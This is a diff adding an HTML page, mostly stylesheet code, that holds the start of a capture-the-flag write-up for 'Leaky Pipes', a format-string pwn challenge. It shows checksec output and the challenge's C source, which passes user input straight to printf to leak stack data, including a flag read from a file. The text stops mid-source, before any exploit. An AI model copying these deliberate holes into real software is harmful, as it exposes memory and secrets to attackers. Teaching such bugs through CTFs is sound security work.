@@ -1,0 +1,1520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+  <style>
+  @font-face {
+  font-family: octicons-link;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+.markdown-body .octicon {
+  display: inline-block;
+  fill: currentColor;
+  vertical-align: text-bottom;
+}
+
+.markdown-body .anchor {
+  float: left;
+  line-height: 1;
+  margin-left: -20px;
+  padding-right: 4px;
+}
+
+.markdown-body .anchor:focus {
+  outline: none;
+}
+
+.markdown-body h1 .octicon-link,
+.markdown-body h2 .octicon-link,
+.markdown-body h3 .octicon-link,
+.markdown-body h4 .octicon-link,
+.markdown-body h5 .octicon-link,
+.markdown-body h6 .octicon-link {
+  color: #1b1f23;
+  vertical-align: middle;
+  visibility: hidden;
+}
+
+.markdown-body h1:hover .anchor,
+.markdown-body h2:hover .anchor,
+.markdown-body h3:hover .anchor,
+.markdown-body h4:hover .anchor,
+.markdown-body h5:hover .anchor,
+.markdown-body h6:hover .anchor {
+  text-decoration: none;
+}
+
+.markdown-body h1:hover .anchor .octicon-link,
+.markdown-body h2:hover .anchor .octicon-link,
+.markdown-body h3:hover .anchor .octicon-link,
+.markdown-body h4:hover .anchor .octicon-link,
+.markdown-body h5:hover .anchor .octicon-link,
+.markdown-body h6:hover .anchor .octicon-link {
+  visibility: visible;
+}
+
+.markdown-body {
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+  color: #24292e;
+  line-height: 1.5;
+  font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;
+  font-size: 16px;
+  line-height: 1.5;
+  word-wrap: break-word;
+}
+
+.markdown-body .pl-c {
+  color: #6a737d;
+}
+
+.markdown-body .pl-c1,
+.markdown-body .pl-s .pl-v {
+  color: #005cc5;
+}
+
+.markdown-body .pl-e,
+.markdown-body .pl-en {
+  color: #6f42c1;
+}
+
+.markdown-body .pl-s .pl-s1,
+.markdown-body .pl-smi {
+  color: #24292e;
+}
+
+.markdown-body .pl-ent {
+  color: #22863a;
+}
+
+.markdown-body .pl-k {
+  color: #d73a49;
+}
+
+.markdown-body .pl-pds,
+.markdown-body .pl-s,
+.markdown-body .pl-s .pl-pse .pl-s1,
+.markdown-body .pl-sr,
+.markdown-body .pl-sr .pl-cce,
+.markdown-body .pl-sr .pl-sra,
+.markdown-body .pl-sr .pl-sre {
+  color: #032f62;
+}
+
+.markdown-body .pl-smw,
+.markdown-body .pl-v {
+  color: #e36209;
+}
+
+.markdown-body .pl-bu {
+  color: #b31d28;
+}
+
+.markdown-body .pl-ii {
+  background-color: #b31d28;
+  color: #fafbfc;
+}
+
+.markdown-body .pl-c2 {
+  background-color: #d73a49;
+  color: #fafbfc;
+}
+
+.markdown-body .pl-c2:before {
+  content: "^M";
+}
+
+.markdown-body .pl-sr .pl-cce {
+  color: #22863a;
+  font-weight: 700;
+}
+
+.markdown-body .pl-ml {
+  color: #735c0f;
+}
+
+.markdown-body .pl-mh,
+.markdown-body .pl-mh .pl-en,
+.markdown-body .pl-ms {
+  color: #005cc5;
+  font-weight: 700;
+}
+
+.markdown-body .pl-mi {
+  color: #24292e;
+  font-style: italic;
+}
+
+.markdown-body .pl-mb {
+  color: #24292e;
+  font-weight: 700;
+}
+
+.markdown-body .pl-md {
+  background-color: #ffeef0;
+  color: #b31d28;
+}
+
+.markdown-body .pl-mi1 {
+  background-color: #f0fff4;
+  color: #22863a;
+}
+
+.markdown-body .pl-mc {
+  background-color: #ffebda;
+  color: #e36209;
+}
+
+.markdown-body .pl-mi2 {
+  background-color: #005cc5;
+  color: #f6f8fa;
+}
+
+.markdown-body .pl-mdr {
+  color: #6f42c1;
+  font-weight: 700;
+}
+
+.markdown-body .pl-ba {
+  color: #586069;
+}
+
+.markdown-body .pl-sg {
+  color: #959da5;
+}
+
+.markdown-body .pl-corl {
+  color: #032f62;
+  text-decoration: underline;
+}
+
+.markdown-body details {
+  display: block;
+}
+
+.markdown-body summary {
+  display: list-item;
+}
+
+.markdown-body a {
+  background-color: transparent;
+}
+
+.markdown-body a:active,
+.markdown-body a:hover {
+  outline-width: 0;
+}
+
+.markdown-body strong {
+  font-weight: inherit;
+  font-weight: bolder;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+  margin: .67em 0;
+}
+
+.markdown-body img {
+  border-style: none;
+}
+
+.markdown-body code,
+.markdown-body kbd,
+.markdown-body pre {
+  font-family: monospace,monospace;
+  font-size: 1em;
+}
+
+.markdown-body hr {
+  box-sizing: content-box;
+  height: 0;
+  overflow: visible;
+}
+
+.markdown-body input {
+  font: inherit;
+  margin: 0;
+}
+
+.markdown-body input {
+  overflow: visible;
+}
+
+.markdown-body [type=checkbox] {
+  box-sizing: border-box;
+  padding: 0;
+}
+
+.markdown-body * {
+  box-sizing: border-box;
+}
+
+.markdown-body input {
+  font-family: inherit;
+  font-size: inherit;
+  line-height: inherit;
+}
+
+.markdown-body a {
+  color: #0366d6;
+  text-decoration: none;
+}
+
+.markdown-body a:hover {
+  text-decoration: underline;
+}
+
+.markdown-body strong {
+  font-weight: 600;
+}
+
+.markdown-body hr {
+  background: transparent;
+  border: 0;
+  border-bottom: 1px solid #dfe2e5;
+  height: 0;
+  margin: 15px 0;
+  overflow: hidden;
+}
+
+.markdown-body hr:before {
+  content: "";
+  display: table;
+}
+
+.markdown-body hr:after {
+  clear: both;
+  content: "";
+  display: table;
+}
+
+.markdown-body table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+.markdown-body td,
+.markdown-body th {
+  padding: 0;
+}
+
+.markdown-body details summary {
+  cursor: pointer;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  margin-bottom: 0;
+  margin-top: 0;
+}
+
+.markdown-body h1 {
+  font-size: 32px;
+}
+
+.markdown-body h1,
+.markdown-body h2 {
+  font-weight: 600;
+}
+
+.markdown-body h2 {
+  font-size: 24px;
+}
+
+.markdown-body h3 {
+  font-size: 20px;
+}
+
+.markdown-body h3,
+.markdown-body h4 {
+  font-weight: 600;
+}
+
+.markdown-body h4 {
+  font-size: 16px;
+}
+
+.markdown-body h5 {
+  font-size: 14px;
+}
+
+.markdown-body h5,
+.markdown-body h6 {
+  font-weight: 600;
+}
+
+.markdown-body h6 {
+  font-size: 12px;
+}
+
+.markdown-body p {
+  margin-bottom: 10px;
+  margin-top: 0;
+}
+
+.markdown-body blockquote {
+  margin: 0;
+}
+
+.markdown-body ol,
+.markdown-body ul {
+  margin-bottom: 0;
+  margin-top: 0;
+  padding-left: 0;
+}
+
+.markdown-body ol ol,
+.markdown-body ul ol {
+  list-style-type: lower-roman;
+}
+
+.markdown-body ol ol ol,
+.markdown-body ol ul ol,
+.markdown-body ul ol ol,
+.markdown-body ul ul ol {
+  list-style-type: lower-alpha;
+}
+
+.markdown-body dd {
+  margin-left: 0;
+}
+
+.markdown-body code,
+.markdown-body pre {
+  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+  font-size: 12px;
+}
+
+.markdown-body pre {
+  margin-bottom: 0;
+  margin-top: 0;
+}
+
+.markdown-body input::-webkit-inner-spin-button,
+.markdown-body input::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  appearance: none;
+  margin: 0;
+}
+
+.markdown-body .border {
+  border: 1px solid #e1e4e8!important;
+}
+
+.markdown-body .border-0 {
+  border: 0!important;
+}
+
+.markdown-body .border-bottom {
+  border-bottom: 1px solid #e1e4e8!important;
+}
+
+.markdown-body .rounded-1 {
+  border-radius: 3px!important;
+}
+
+.markdown-body .bg-white {
+  background-color: #fff!important;
+}
+
+.markdown-body .bg-gray-light {
+  background-color: #fafbfc!important;
+}
+
+.markdown-body .text-gray-light {
+  color: #6a737d!important;
+}
+
+.markdown-body .mb-0 {
+  margin-bottom: 0!important;
+}
+
+.markdown-body .my-2 {
+  margin-bottom: 8px!important;
+  margin-top: 8px!important;
+}
+
+.markdown-body .pl-0 {
+  padding-left: 0!important;
+}
+
+.markdown-body .py-0 {
+  padding-bottom: 0!important;
+  padding-top: 0!important;
+}
+
+.markdown-body .pl-1 {
+  padding-left: 4px!important;
+}
+
+.markdown-body .pl-2 {
+  padding-left: 8px!important;
+}
+
+.markdown-body .py-2 {
+  padding-bottom: 8px!important;
+  padding-top: 8px!important;
+}
+
+.markdown-body .pl-3,
+.markdown-body .px-3 {
+  padding-left: 16px!important;
+}
+
+.markdown-body .px-3 {
+  padding-right: 16px!important;
+}
+
+.markdown-body .pl-4 {
+  padding-left: 24px!important;
+}
+
+.markdown-body .pl-5 {
+  padding-left: 32px!important;
+}
+
+.markdown-body .pl-6 {
+  padding-left: 40px!important;
+}
+
+.markdown-body .f6 {
+  font-size: 12px!important;
+}
+
+.markdown-body .lh-condensed {
+  line-height: 1.25!important;
+}
+
+.markdown-body .text-bold {
+  font-weight: 600!important;
+}
+
+.markdown-body:before {
+  content: "";
+  display: table;
+}
+
+.markdown-body:after {
+  clear: both;
+  content: "";
+  display: table;
+}
+
+.markdown-body>:first-child {
+  margin-top: 0!important;
+}
+
+.markdown-body>:last-child {
+  margin-bottom: 0!important;
+}
+
+.markdown-body a:not([href]) {
+  color: inherit;
+  text-decoration: none;
+}
+
+.markdown-body blockquote,
+.markdown-body dl,
+.markdown-body ol,
+.markdown-body p,
+.markdown-body pre,
+.markdown-body table,
+.markdown-body ul {
+  margin-bottom: 16px;
+  margin-top: 0;
+}
+
+.markdown-body hr {
+  background-color: #e1e4e8;
+  border: 0;
+  height: .25em;
+  margin: 24px 0;
+  padding: 0;
+}
+
+.markdown-body blockquote {
+  border-left: .25em solid #dfe2e5;
+  color: #6a737d;
+  padding: 0 1em;
+}
+
+.markdown-body blockquote>:first-child {
+  margin-top: 0;
+}
+
+.markdown-body blockquote>:last-child {
+  margin-bottom: 0;
+}
+
+.markdown-body kbd {
+  background-color: #fafbfc;
+  border: 1px solid #c6cbd1;
+  border-bottom-color: #959da5;
+  border-radius: 3px;
+  box-shadow: inset 0 -1px 0 #959da5;
+  color: #444d56;
+  display: inline-block;
+  font-size: 11px;
+  line-height: 10px;
+  padding: 3px 5px;
+  vertical-align: middle;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  font-weight: 600;
+  line-height: 1.25;
+  margin-bottom: 16px;
+  margin-top: 24px;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+}
+
+.markdown-body h1,
+.markdown-body h2 {
+  border-bottom: 1px solid #eaecef;
+  padding-bottom: .3em;
+}
+
+.markdown-body h2 {
+  font-size: 1.5em;
+}
+
+.markdown-body h3 {
+  font-size: 1.25em;
+}
+
+.markdown-body h4 {
+  font-size: 1em;
+}
+
+.markdown-body h5 {
+  font-size: .875em;
+}
+
+.markdown-body h6 {
+  color: #6a737d;
+  font-size: .85em;
+}
+
+.markdown-body ol,
+.markdown-body ul {
+  padding-left: 2em;
+}
+
+.markdown-body ol ol,
+.markdown-body ol ul,
+.markdown-body ul ol,
+.markdown-body ul ul {
+  margin-bottom: 0;
+  margin-top: 0;
+}
+
+.markdown-body li {
+  word-wrap: break-all;
+}
+
+.markdown-body li>p {
+  margin-top: 16px;
+}
+
+.markdown-body li+li {
+  margin-top: .25em;
+}
+
+.markdown-body dl {
+  padding: 0;
+}
+
+.markdown-body dl dt {
+  font-size: 1em;
+  font-style: italic;
+  font-weight: 600;
+  margin-top: 16px;
+  padding: 0;
+}
+
+.markdown-body dl dd {
+  margin-bottom: 16px;
+  padding: 0 16px;
+}
+
+.markdown-body table {
+  display: block;
+  overflow: auto;
+  width: 100%;
+}
+
+.markdown-body table th {
+  font-weight: 600;
+}
+
+.markdown-body table td,
+.markdown-body table th {
+  border: 1px solid #dfe2e5;
+  padding: 6px 13px;
+}
+
+.markdown-body table tr {
+  background-color: #fff;
+  border-top: 1px solid #c6cbd1;
+}
+
+.markdown-body table tr:nth-child(2n) {
+  background-color: #f6f8fa;
+}
+
+.markdown-body img {
+  background-color: #fff;
+  box-sizing: content-box;
+  max-width: 100%;
+}
+
+.markdown-body img[align=right] {
+  padding-left: 20px;
+}
+
+.markdown-body img[align=left] {
+  padding-right: 20px;
+}
+
+.markdown-body code {
+  background-color: rgba(27,31,35,.05);
+  border-radius: 3px;
+  font-size: 85%;
+  margin: 0;
+  padding: .2em .4em;
+}
+
+.markdown-body pre {
+  word-wrap: normal;
+}
+
+.markdown-body pre>code {
+  background: transparent;
+  border: 0;
+  font-size: 100%;
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  word-break: normal;
+}
+
+.markdown-body .highlight {
+  margin-bottom: 16px;
+}
+
+.markdown-body .highlight pre {
+  margin-bottom: 0;
+  word-break: normal;
+}
+
+.markdown-body .highlight pre,
+.markdown-body pre {
+  background-color: #f6f8fa;
+  border-radius: 3px;
+  font-size: 85%;
+  line-height: 1.45;
+  overflow: auto;
+  padding: 16px;
+}
+
+.markdown-body pre code {
+  background-color: transparent;
+  border: 0;
+  display: inline;
+  line-height: inherit;
+  margin: 0;
+  max-width: auto;
+  overflow: visible;
+  padding: 0;
+  word-wrap: normal;
+}
+
+.markdown-body .commit-tease-sha {
+  color: #444d56;
+  display: inline-block;
+  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+  font-size: 90%;
+}
+
+.markdown-body .blob-wrapper {
+  border-bottom-left-radius: 3px;
+  border-bottom-right-radius: 3px;
+  overflow-x: auto;
+  overflow-y: hidden;
+}
+
+.markdown-body .blob-wrapper-embedded {
+  max-height: 240px;
+  overflow-y: auto;
+}
+
+.markdown-body .blob-num {
+  -moz-user-select: none;
+  -ms-user-select: none;
+  -webkit-user-select: none;
+  color: rgba(27,31,35,.3);
+  cursor: pointer;
+  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+  font-size: 12px;
+  line-height: 20px;
+  min-width: 50px;
+  padding-left: 10px;
+  padding-right: 10px;
+  text-align: right;
+  user-select: none;
+  vertical-align: top;
+  white-space: nowrap;
+  width: 1%;
+}
+
+.markdown-body .blob-num:hover {
+  color: rgba(27,31,35,.6);
+}
+
+.markdown-body .blob-num:before {
+  content: attr(data-line-number);
+}
+
+.markdown-body .blob-code {
+  line-height: 20px;
+  padding-left: 10px;
+  padding-right: 10px;
+  position: relative;
+  vertical-align: top;
+}
+
+.markdown-body .blob-code-inner {
+  color: #24292e;
+  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+  font-size: 12px;
+  overflow: visible;
+  white-space: pre;
+  word-wrap: normal;
+}
+
+.markdown-body .pl-token.active,
+.markdown-body .pl-token:hover {
+  background: #ffea7f;
+  cursor: pointer;
+}
+
+.markdown-body kbd {
+  background-color: #fafbfc;
+  border: 1px solid #d1d5da;
+  border-bottom-color: #c6cbd1;
+  border-radius: 3px;
+  box-shadow: inset 0 -1px 0 #c6cbd1;
+  color: #444d56;
+  display: inline-block;
+  font: 11px SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+  line-height: 10px;
+  padding: 3px 5px;
+  vertical-align: middle;
+}
+
+.markdown-body :checked+.radio-label {
+  border-color: #0366d6;
+  position: relative;
+  z-index: 1;
+}
+
+.markdown-body .tab-size[data-tab-size="1"] {
+  -moz-tab-size: 1;
+  tab-size: 1;
+}
+
+.markdown-body .tab-size[data-tab-size="2"] {
+  -moz-tab-size: 2;
+  tab-size: 2;
+}
+
+.markdown-body .tab-size[data-tab-size="3"] {
+  -moz-tab-size: 3;
+  tab-size: 3;
+}
+
+.markdown-body .tab-size[data-tab-size="4"] {
+  -moz-tab-size: 4;
+  tab-size: 4;
+}
+
+.markdown-body .tab-size[data-tab-size="5"] {
+  -moz-tab-size: 5;
+  tab-size: 5;
+}
+
+.markdown-body .tab-size[data-tab-size="6"] {
+  -moz-tab-size: 6;
+  tab-size: 6;
+}
+
+.markdown-body .tab-size[data-tab-size="7"] {
+  -moz-tab-size: 7;
+  tab-size: 7;
+}
+
+.markdown-body .tab-size[data-tab-size="8"] {
+  -moz-tab-size: 8;
+  tab-size: 8;
+}
+
+.markdown-body .tab-size[data-tab-size="9"] {
+  -moz-tab-size: 9;
+  tab-size: 9;
+}
+
+.markdown-body .tab-size[data-tab-size="10"] {
+  -moz-tab-size: 10;
+  tab-size: 10;
+}
+
+.markdown-body .tab-size[data-tab-size="11"] {
+  -moz-tab-size: 11;
+  tab-size: 11;
+}
+
+.markdown-body .tab-size[data-tab-size="12"] {
+  -moz-tab-size: 12;
+  tab-size: 12;
+}
+
+.markdown-body .task-list-item {
+  list-style-type: none;
+}
+
+.markdown-body .task-list-item+.task-list-item {
+  margin-top: 3px;
+}
+
+.markdown-body .task-list-item input {
+  margin: 0 .2em .25em -1.6em;
+  vertical-align: middle;
+}
+
+.markdown-body hr {
+  border-bottom-color: #eee;
+}
+
+.markdown-body .pl-0 {
+  padding-left: 0!important;
+}
+
+.markdown-body .pl-1 {
+  padding-left: 4px!important;
+}
+
+.markdown-body .pl-2 {
+  padding-left: 8px!important;
+}
+
+.markdown-body .pl-3 {
+  padding-left: 16px!important;
+}
+
+.markdown-body .pl-4 {
+  padding-left: 24px!important;
+}
+
+.markdown-body .pl-5 {
+  padding-left: 32px!important;
+}
+
+.markdown-body .pl-6 {
+  padding-left: 40px!important;
+}
+
+.markdown-body .pl-7 {
+  padding-left: 48px!important;
+}
+
+.markdown-body .pl-8 {
+  padding-left: 64px!important;
+}
+
+.markdown-body .pl-9 {
+  padding-left: 80px!important;
+}
+
+.markdown-body .pl-10 {
+  padding-left: 96px!important;
+}
+
+.markdown-body .pl-11 {
+  padding-left: 112px!important;
+}
+
+.markdown-body .pl-12 {
+  padding-left: 128px!important;
+}
+
+  </style>
+  <style>
+  /**
+ * prism.js default theme for JavaScript, CSS and HTML
+ * Based on dabblet (http://dabblet.com)
+ * @author Lea Verou
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: black;
+	background: none;
+	text-shadow: 0 1px white;
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+pre[class*="language-"]::-moz-selection, pre[class*="language-"] ::-moz-selection,
+code[class*="language-"]::-moz-selection, code[class*="language-"] ::-moz-selection {
+	text-shadow: none;
+	background: #b3d4fc;
+}
+
+pre[class*="language-"]::selection, pre[class*="language-"] ::selection,
+code[class*="language-"]::selection, code[class*="language-"] ::selection {
+	text-shadow: none;
+	background: #b3d4fc;
+}
+
+@media print {
+	code[class*="language-"],
+	pre[class*="language-"] {
+		text-shadow: none;
+	}
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #f5f2f0;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: slategray;
+}
+
+.token.punctuation {
+	color: #999;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.boolean,
+.token.number,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #905;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #690;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string {
+	color: #9a6e3a;
+	/* This background color was intended by the author of this theme. */
+	background: hsla(0, 0%, 100%, .5);
+}
+
+.token.atrule,
+.token.attr-value,
+.token.keyword {
+	color: #07a;
+}
+
+.token.function,
+.token.class-name {
+	color: #DD4A68;
+}
+
+.token.regex,
+.token.important,
+.token.variable {
+	color: #e90;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+
+  </style>
+  <style>
+  
+  </style>
+  <style>
+    .markdown-body {
+      font-family: -apple-system,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;
+      box-sizing: border-box;
+      min-width: 200px;
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 45px;
+    }
+
+    @media not print {
+      .markdown-body {
+        padding: 45px;
+      }
+
+      @media (max-width: 767px) {
+        .markdown-body {
+          padding: 15px;
+        }
+      }
+    }
+
+    .hf-container {
+      color: #24292e;
+      line-height: 1.3;
+    }
+
+    .markdown-body .highlight pre,
+    .markdown-body pre {
+      white-space: pre-wrap;
+    }
+    .markdown-body table {
+      display: table;
+    }
+    .markdown-body img[data-align="center"] {
+      display: block;
+      margin: 0 auto;
+    }
+    .markdown-body img[data-align="right"] {
+      display: block;
+      margin: 0 0 0 auto;
+    }
+    .markdown-body li.task-list-item {
+      list-style-type: none;
+    }
+    .markdown-body li > [type=checkbox] {
+      margin: 0 0 0 -1.3em;
+    }
+    .markdown-body input[type="checkbox"] ~ p {
+      margin-top: 0;
+      display: inline-block;
+    }
+    .markdown-body ol ol,
+    .markdown-body ul ol {
+      list-style-type: decimal;
+    }
+    .markdown-body ol ol ol,
+    .markdown-body ol ul ol,
+    .markdown-body ul ol ol,
+    .markdown-body ul ul ol {
+      list-style-type: decimal;
+    }
+  </style>
+  <style>.markdown-body a.footnote-ref {
+  text-decoration: none;
+}
+
+.footnotes {
+  font-size: .85em;
+  opacity: .8;
+}
+
+.footnotes li[role="doc-endnote"] {
+  position: relative;
+}
+
+.footnotes .footnote-back {
+  position: absolute;
+  font-family: initial;
+  top: .2em;
+  right: 1em;
+  text-decoration: none;
+}
+
+.inline-math.invalid,
+.multiple-math.invalid {
+  color: rgb(255, 105, 105);
+}
+
+.toc-container {
+  width: 100%;
+}
+
+.toc-container .toc-title {
+  font-weight: 700;
+  font-size: 1.2em;
+  margin-bottom: 0;
+}
+
+.toc-container li,
+.toc-container ul,
+.toc-container ul li {
+  list-style: none !important;
+}
+
+.toc-container > ul {
+  padding-left: 0;
+}
+
+.toc-container ul li span {
+  display : flex;
+}
+
+.toc-container ul li span a {
+  color: inherit;
+  text-decoration: none;
+}
+.toc-container ul li span a:hover {
+  color: inherit;
+  text-decoration: none;
+}
+
+.toc-container ul li span span.dots {
+  flex: 1;
+  height: 0.65em;
+  margin: 0 10px;
+  border-bottom: 2px dotted black;
+}
+</style>
+  <style>.markdown-body{}pre.front-matter{display:none!important;}</style>
+</head>
+<body>
+  <article class="markdown-body"><h1 class="atx" id="leaky-pipes">Leaky Pipes</h1>
+<p> Hard  Pwn</p>
+<p><a href="https://app.traboda.com/challenge/1071">Open Challenge</a> </p>
+<p><strong>Author</strong>:&nbsp;<a href="https://twitter.com/BhaskaraShravya">d1g174l_f0r7r355</a></p>
+<p>This was one of the hard challenges I made for inctfj qualifiers. It is based on format strings. I will try to explain all the concepts required and used in this challenge.</p>
+<h4 class="atx" id="preliminary-checks">Preliminary checks:</h4>
+<p>It is a 64 bit, dynamically linked, non-stripped binary.</p>
+<pre><code class="fenced-code-block">gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+gdb-peda$ </code></pre>
+<p>For this challenge all protections are enabled and so the chances of any possible overflow or injecting shellcode is ruled out and we will have to find some other way to pwn it. The source code for the challenge was also given along with the challenge. To understand what the program is actually doing, let's first analyze the source in detail.</p>
+<h4 class="atx" id="source-code-analysis">Source Code analysis:</h4>
+<pre><code class="fenced-code-block language-c=">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;time.h&gt;
+#include&lt;unistd.h&gt;
+
+int bal = 100;
+void use_tape(){
+char experience[50];
+char flag[50];
+
+FILE *fp;
+fp = fopen("flag.txt", "rb");
+if(fp != NULL){
+fgets(flag, 50, fp);
+fclose(fp);
+
+printf("Please give us your feedback!\n");
+fgets(experience, 50, stdin);
+printf(experience);
+exit(0);
+}else{
+printf("Error opening file!\n");
+exit(1);
+}
+
+}
+
+void check_leaks(){
+char leak[100];
+
+printf("You currently have %d dollars with you!\n", bal);
+
+printf("Where would you like to check your leaks? \n");
+fgets(leak, 100, stdin);
+printf(leak);
+
+}
+
+void call_plumber(){
+printf("Why must you call the plumber when you can fix the leak yourself?\n");
+}
+
+void buy_repair_kit(){
+if(bal == 200){
+use_tape();
+}else{
+printf("You do not have enough balance! :(\n");
+}
+}
+
+void initialize()
+{
+  setvbuf(stdin,0,2,0);
+  setvbuf(stdout,0,2,0);
+  setvbuf(stderr,0,2,0);
+  alarm(30);
+}
+
+int main(){
+char choice; int bal;
+
+initialize();
+
+printf("Welcome to my home!\nI have recently bought a new house, however, there seems to be a small leakage problem with the pipes.\nI was hoping you could help me fix it.\n");
+while(1){
+printf("\n1. Check for leaks\n2. Call plumber\n3. Buy repair kit\n\nChoice: ");
+
+scanf("%c", &amp;choice);
+getchar();
+fflush(stdin);
+
